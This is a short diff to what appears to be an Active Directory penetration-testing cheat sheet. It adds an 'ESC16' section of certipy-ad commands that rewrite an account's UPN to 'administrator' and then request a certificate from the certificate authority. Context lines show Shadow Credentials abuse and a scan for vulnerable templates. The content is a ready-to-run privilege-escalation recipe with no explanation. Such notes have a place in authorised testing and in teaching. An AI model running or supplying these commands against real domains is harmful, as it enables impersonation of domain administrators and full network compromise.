@@ -187,4 +187,11 @@ gpupdate /force
 certipy-ad shadow auto -u <user> -p <password> -account <account> -dc-ip <ip>
 
 certipy-ad find -u <user> -hashes <hashes> -dc-ip <ip> -vulnerable
+
+# ESC16 
+certipy-ad account -u <user> -hashes <hashes> -user <CA user> -upn administrator update
+
+certipy-ad account -u <user> -hashes <hashes> -user <CA user> read
+
+certipy-ad req -u <CA user> -hashes <hash> -dc-ip <ip> -target <FQDN> -ca <CA Authority name> -template User
 ```
